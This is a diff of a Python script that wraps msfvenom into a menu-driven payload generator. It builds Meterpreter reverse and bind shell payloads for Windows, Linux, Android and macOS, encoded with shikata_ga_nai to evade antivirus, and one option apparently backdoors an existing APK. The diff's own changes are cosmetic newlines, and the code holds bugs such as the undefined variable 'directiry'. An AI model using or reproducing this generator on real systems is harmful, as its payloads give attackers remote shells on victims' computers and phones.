@@ -4,12 +4,13 @@ import os
 def windows(namder):
     if (namder == 1) or (namder == 11):
         a = 1
-        port = int(input('lport: '))
+        port = int(input('\nlport: '))
         directory = str(input('dir save: '))
         b = list(directory)
         if b[-1] != '/':
             directory += '/'
         name = str(input('name_file: '))
+        
         
         if namder == 1:
             subprocess.check_output(
@@ -20,13 +21,14 @@ def windows(namder):
     
     elif (namder == 2) or (namder == 4) or (namder == 5) or (namder == 7) or (namder == 8) or (namder == 10):
         a = 1
-        host = str(input('lhost: '))
+        host = str(input('\nlhost: '))
         port = int(input('lport: '))
         directory = str(input('dir save: '))
         b = list(directory)
         if b[-1] != '/':
             directory += '/'
         name = str(input('name_file: '))
+        
 
         if namder == 2:
             subprocess.check_output(
@@ -49,31 +51,34 @@ def windows(namder):
     
     elif namder == 3:
         a = 1
-        host = str(input('lhost: '))
+        host = str(input('\nlhost: '))
         directory = str(input('dir save: '))
         b = list(directory)
         if b[-1] != '/':
             directory += '/'
         name = str(input('name_file: '))
+        
 
         subprocess.check_output(
             f'msfvenom -p windows/meterpreter/reverse_https lhost={host} lport=443 -e x86/shikata_ga_nai -i 5 -f exe > {directiry}{name}.exe', shell=True)
     
     elif namder == 6:
         a = 1
-        host = str(input('lhost: '))
+        host = str(input('\nlhost: '))
         port = int(input('lport: '))
+        
 
         subprocess.call(
             f'msfvenom -p windows/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f vba', shell=True)
     
     elif namder == 9:
-        cmd = str(input('cmd: '))
+        cmd = str(input('\ncmd: '))
         directory = str(input('dir save: '))
         b = list(directory)
         if b[-1] != '/':
             directory += '/'
         name = str(input('name_file: '))
+        
 
         subprocess.check_output(
             f'msfvenom -p windows/exec CMD="{cmd}" -e x86/shikata_ga_nai -i 5 -f exe > {directiry}{name}.exe', shell=True)
@@ -87,13 +92,14 @@ def windows(namder):
 def linux(namder):
     if (namder == 1) or (namder == 2):
         a = 1
-        host = str(input('lhost: '))
+        host = str(input('\nlhost: '))
         port = int(input('lport: '))
         directory = str(input('dir save: '))
         b = list(directory)
         if b[-1] != '/':
             directory += '/'
         name = str(input('name_file: '))
+        
 
         if namder == 1:
             subprocess.check_output(
@@ -104,12 +110,13 @@ def linux(namder):
     
     elif (namder == 3) or (namder == 5):
         a = 1
-        port = int(input('lport: '))
+        port = int(input('\nlport: '))
         directory = str(input('dir save: '))
         b = list(directory)
         if b[-1] != '/':
             directory += '/'
         name = str(input('name_file: '))
+        
         
         if namder == 3:
             subprocess.check_output(
@@ -119,12 +126,13 @@ def linux(namder):
                 f'msfvenom -p python/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 -f py > {directory}{name}.py', shell=True)
     
     elif namder == 4:
-        cmd = str(input('cmd: '))
+        cmd = str(input('\ncmd: '))
         directory = str(input('dir save: '))
         b = list(directory)
         if b[-1] != '/':
             directory += '/'
         name = str(input('name_file: '))
+        
 
         subprocess.check_output(
             f'msfvenom -p linux/x86/exec CMD="{cmd}" -e x86/shikata_ga_nai -i 5 -f elf > {directiry}{name}', shell=True)
@@ -138,20 +146,21 @@ def linux(namder):
 def android(namder):
     if namder == 1:
         a = 1
-        host = str(input('lhost: '))
+        host = str(input('\nlhost: '))
         port = int(input('lport: '))
         directory = str(input('dir save: '))
         b = list(directory)
         if b[-1] != '/':
             directory += '/'
         name = str(input('name_file: '))
+        
 
         subprocess.check_output(
             f'msfvenom -p android/meterpreter/reverse_tcp lhost={host} lport={port} > {directory}{name}.apk', shell=True)
     
     elif namder == 2:
         a = 1
-        host = str(input('lhost: '))
+        host = str(input('\nlhost: '))
         port = str(input('lport: '))
         directory = str(input('Original apk: '))
 
@@ -182,13 +191,15 @@ def android(namder):
 def mac(namder):
     if (namder == 1) or (namder == 4):
         a = 1
-        host = str(input('lhost: '))
+        host = str(input('\nlhost: '))
         port = int(input('lport: '))
         directory = str(input('dir save: '))
         b = list(directory)
         if b[-1] != '/':
             directory += '/'
         name = str(input('name_file: '))
+        
+
         if namder == 1:
             subprocess.check_output(
                 f'msfvenom -p osx/x64/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f macho > {directory}{name}.macho')
@@ -199,12 +210,13 @@ def mac(namder):
     
     elif (namder == 2) or (namder == 5):
         a = 1
-        port = int(input('lport: '))
+        port = int(input('\nlport: '))
         directory = str(input('dir save: '))
         b = list(directory)
         if b[-1] != '/':
             directory += '/'
         name = str(input('name_file: '))
+        
         
         if namder == 2:
             subprocess.check_output(
@@ -214,19 +226,20 @@ def mac(namder):
                 f'msfvenom -p python/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 -f py > {directory}{name}.py', shell=True)
     
     elif namder == 3:
-        cmd = str(input('cmd: '))
+        cmd = str(input('\ncmd: '))
         directory = str(input('dir save: '))
         b = list(directory)
         if b[-1] != '/':
             directory += '/'
         name = str(input('name_file: '))
+        
 
         subprocess.check_output(
             f'msfvenom -p osx/x86/exec CMD="{cmd}" -e x86/shikata_ga_nai -i 5 -f macho > {directiry}{name}.macho', shell=True)
     
     elif namder == 6:
         a = 1
-        host = str(input('lhost: '))
+        host = str(input('\nlhost: '))
         port = int(input('lport: '))
 
         subprocess.call(
